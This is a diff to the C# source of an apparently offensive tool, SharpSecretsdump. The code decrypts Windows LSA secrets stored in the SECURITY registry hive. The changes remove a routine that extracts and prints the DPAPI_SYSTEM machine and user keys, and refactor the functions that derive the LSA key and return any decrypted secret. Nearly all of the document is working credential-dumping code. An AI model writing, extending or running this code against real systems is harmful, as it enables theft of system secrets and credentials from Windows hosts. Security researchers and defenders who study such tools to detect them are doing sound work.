@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -8,41 +7,8 @@ namespace SharpSecretsdump
 {
     public class LSADump
     {
-        public static List<byte[]> GetDPAPIKeys(bool show = false)
+        public static byte[] GetLSASecret(string secretName, byte[] LSAKey)
         {
-            // retrieves the "DPAPI_SYSTEM" LSA secret wuth the GetLSASecret() function,
-            //  returning a list of @(machineDPAPI, userDPAPI)
-            List<byte[]> dpapiKeys = new List<byte[]>();
-
-            byte[] dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM");
-            if (dpapiKeyFull == null)
-            {
-                return null;
-            }
-            byte[] dpapiKeyMachine = new byte[20];
-            byte[] dpapiKeyUser = new byte[20];
-
-            Array.Copy(dpapiKeyFull, 0, dpapiKeyMachine, 0, 20);
-            Array.Copy(dpapiKeyFull, 20, dpapiKeyUser, 0, 20);
-
-            dpapiKeys.Add(dpapiKeyMachine);
-            dpapiKeys.Add(dpapiKeyUser);
-
-            if (show)
-            {
-                Console.WriteLine("[*] DPAPI_SYSTEM");
-                Console.WriteLine("dpapi_machinekey:0x{0}", BitConverter.ToString(dpapiKeyMachine).Replace("-", "").ToLower());
-                Console.WriteLine("dpapi_userkey:0x{0}", BitConverter.ToString(dpapiKeyUser).Replace("-", "").ToLower());
-            }
-
-            return dpapiKeys;
-        }
-
-        public static byte[] GetLSASecret(string secretName)
-        {
-            // get the LSA key needed to secret decryption
-            byte[] LSAKey = GetLSAKey();
-
             string keyPath = String.Format("SECURITY\\Policy\\Secrets\\{0}\\CurrVal", secretName);
             byte[] keyData = Helpers.GetRegKeyValue(keyPath);
 
@@ -58,27 +24,13 @@ namespace SharpSecretsdump
             // use the temp key to decrypt the rest of the plaintext
             byte[] keyEncryptedDataRemainder = new byte[keyEncryptedData.Length - 32];
             Array.Copy(keyEncryptedData, 32, keyEncryptedDataRemainder, 0, keyEncryptedDataRemainder.Length);
-            byte[] IV = new byte[16];
             byte[] keyPathPlaintext = Crypto.LSAAESDecrypt(tmpKey, keyEncryptedDataRemainder);
 
-            if (secretName.Equals("DPAPI_SYSTEM"))
-            {
-                byte[] secret = new byte[40];
-                Array.Copy(keyPathPlaintext, 20, secret, 0, 40);
-                return secret;
-            }
-            else
-            {
-                Console.WriteLine("[X] LSA Secret '{0}' not yet implemented!", secretName);
-                return null;
-            }
+            return keyPathPlaintext;
         }
 
-        public static byte[] GetLSAKey()
+        public static byte[] GetLSAKey(byte[] bootkey)
         {
-            // retrieves the boot key (syskey) and uses it to retrieve the key used to encrypt LSA secrets
-            byte[] bootkey = GetBootKey();
-
             byte[] LSAKeyEncryptedStruct = Helpers.GetRegKeyValue(@"SECURITY\Policy\PolEKList");
             byte[] LSAEncryptedData = new byte[LSAKeyEncryptedStruct.Length-28];
             Array.Copy(LSAKeyEncryptedStruct, 28, LSAEncryptedData, 0, LSAEncryptedData.Length);
